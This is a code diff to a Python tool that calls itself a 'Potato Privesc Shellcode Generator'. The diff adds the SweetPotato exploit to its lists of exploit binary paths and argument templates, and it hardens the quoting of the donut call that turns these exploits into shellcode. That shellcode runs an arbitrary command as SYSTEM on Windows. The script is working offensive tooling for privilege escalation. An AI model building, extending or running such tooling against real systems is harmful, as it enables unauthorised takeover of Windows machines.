@@ -12,6 +12,7 @@ Usage:
 
 import argparse
 import base64
+import json
 import os
 import sys
 
@@ -43,6 +44,13 @@ POTATO_PATHS = {
         "/opt/tools/Kraken/net_assemblies/bin/EfsPotato-mod/EfsPotato_net40_x64.exe",
         "{script_dir}/EfsPotato.exe",
     ],
+    "SweetPotato": [
+        "{script_dir}/tools/potatoes/SweetPotato.exe",
+        "/opt/killshot/tools/potatoes/SweetPotato.exe",
+        "/opt/my-resources/tools/potatoes/SweetPotato.exe",
+        "/opt/resources/windows/SweetPotato.exe",
+        "{script_dir}/SweetPotato.exe",
+    ],
 }
 
 # Default args for each potato
@@ -51,6 +59,7 @@ POTATO_ARGS = {
     "PrintSpoofer": "-c \"{cmd}\"",
     "BadPotato": "{cmd}",
     "EfsPotato": "{cmd}",
+    "SweetPotato": "-a \"{cmd}\"",
 }
 
 
@@ -108,9 +117,9 @@ def generate(potato_name, cmd, output_path, script_dir):
     # Use donut to convert
     donut_code = f"""
 import donut
-sc = donut.create(file='{potato_path}', arch=2, params='''{args}''', exit_opt=2)
+sc = donut.create(file={json.dumps(potato_path)}, arch=2, params={json.dumps(args)}, exit_opt=2)
 if sc:
-    with open('{tmp_path}', 'wb') as f:
+    with open({json.dumps(tmp_path)}, 'wb') as f:
         f.write(sc)
     print(f'OK {{len(sc)}}')
 else:
@@ -148,7 +157,7 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(description='Potato Privesc Shellcode Generator')
     parser.add_argument('-p', '--potato', required=True,
                         choices=list(POTATO_PATHS.keys()),
-                        help='Potato exploit to use')
+                        help='Potato exploit to use (GodPotato, PrintSpoofer, BadPotato, EfsPotato, SweetPotato)')
     parser.add_argument('-c', '--cmd', required=True,
                         help='Command to execute as SYSTEM')
     parser.add_argument('-o', '--output', required=True,
